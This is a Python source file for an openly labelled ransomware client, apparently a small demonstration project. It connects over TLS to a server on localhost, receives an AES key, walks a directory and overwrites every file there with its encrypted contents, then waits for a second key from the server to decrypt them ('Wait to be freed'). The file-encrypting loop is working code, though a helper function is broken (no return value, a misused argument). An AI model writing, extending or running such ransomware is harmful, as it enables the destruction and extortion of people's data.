import os
import socket
import ssl
from Crypto.Cipher import AES

HOST = '127.0.0.1'
PORT = 8080

def create_ssl_context() -> ssl.SSLContext:
    context = ssl.create_default_context(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='server.crt', keyfile='server.key')

class AESClient:
    def __init__(self, key, path):
        self.key = key
        self.iv = os.urandom(16)
        self.attack_directory(path)
    
    
    def attack_directory(self, path):
        for dirpath, dirnames, filenames in os.walk(path):
            for filename in filenames:
                file_data = open(os.path.join(dirpath, filename), 'rb').read()
                open(os.path.join(dirpath, filename), 'wb').write(self.encrypt_data(file_data))
        

    def recover_directory(self, path):
        for dirpath, dirnames, filenames in os.walk(path):
            for filename in filenames:
                file_data = open(os.path.join(dirpath, filename), 'rb').read()
                open(os.path.join(dirpath, filename), 'wb').write(self.unpad(self.decrypt_data(file_data)))
        

    # Pad plaintext to be a multiple of 16 bytes and store the position to remove it later
    def pad(self, data):
        padding = 16 - len(data) % 16
        return data + bytes([padding]) * padding
    
    
    # Remove padding from the decrypted text
    def unpad(self, data):
        padding = data[-1]
        return data[:-padding]


    def encrypt_data(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ciphertext = cipher.encrypt(self.pad(data))
        return ciphertext
    
    def decrypt_data(self, cyphertext):
        decipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted_data = decipher.decrypt(cyphertext)
        return decrypted_data


if __name__ == '__main__':
    # Create the SSL client
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    context.load_verify_locations('server.crt')
    context.check_hostname = False
    ssl_sock = context.wrap_socket(sock)

    ssl_sock.connect((HOST, PORT))

    # Enter the key and the path you want to attack
    key = ssl_sock.recv(1024)
    ransomeware_client = AESClient(key, 'files')

    # Wait to be freed
    ransomeware_client.key = ssl_sock.recv(1024)
    ransomeware_client.recover_directory('files')

    ssl_sock.close()